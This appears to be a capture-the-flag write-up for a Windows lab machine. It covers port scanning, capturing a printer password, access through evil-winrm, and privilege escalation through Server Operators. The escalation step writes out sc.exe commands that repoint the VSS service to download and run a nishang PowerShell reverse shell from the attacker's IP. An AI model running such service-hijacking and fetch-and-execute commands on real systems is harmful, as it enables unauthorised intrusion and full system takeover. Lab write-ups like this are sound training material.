Run a Nmap scan to find for open ports.

![image](https://user-images.githubusercontent.com/93418272/179000727-ead48bab-ac66-4a45-a4df-1ef2e0fcc653.png)


Head to the web browser.

![image](https://user-images.githubusercontent.com/93418272/179000747-78628aba-53a1-42fb-87f7-8044ed25af44.png)

![image](https://user-images.githubusercontent.com/93418272/179000767-e7eae80f-f100-479d-bec3-667a5f681958.png)


We can change the settings and start a nc listener. 

![image](https://user-images.githubusercontent.com/93418272/179000789-d32d690c-20ee-442a-9551-5ce662d81390.png)


Printer password is gained.

![image](https://user-images.githubusercontent.com/93418272/179000824-327121f6-1a1d-4b8b-842c-f77a79f40a1f.png)


Use the evil-winrm tool to gain acess. 

![image](https://user-images.githubusercontent.com/93418272/179000864-34471f2f-7b78-4ac5-89f2-53c8ce75ce51.png)


Found the user flag. 

![image](https://user-images.githubusercontent.com/93418272/179000890-d7191e51-3381-4e1f-bdbd-f8177b1b233c.png)


Using the net user command , we are able to use Server Operators

![image](https://user-images.githubusercontent.com/93418272/179000917-a359728c-785e-4618-bdc6-1c8148822101.png)


Let's use a powershell script from nishang : https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1

Change the IP address to your attacking machine.

Start a python server with the same location of the powershell script 

Start a nc listener on port 4444.

Use the following commands to start the server to download the script and execute it. 

sc.exe config VSS binpath="C:\Windows\System32\cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.23:81/Invoke-PowerShellTcpOneLine.ps1')"

sc.exe stop VSS

sc.exe start VSS

![image](https://user-images.githubusercontent.com/93418272/179000950-0e9d855a-af2b-487e-8e5a-f2f1f7890c22.png)


The script has been downloaded.

![image](https://user-images.githubusercontent.com/93418272/179000972-858200e8-fa29-42fc-9be8-f1c658598633.png)


Access gained.

![image](https://user-images.githubusercontent.com/93418272/179001018-9f30cac3-f70a-4310-8035-9d6b58dc424b.png)


Head to the Administrator desktop to get the root flag.

![image](https://user-images.githubusercontent.com/93418272/179001062-3851db5c-b82c-435d-b02b-a82f05352c4b.png)
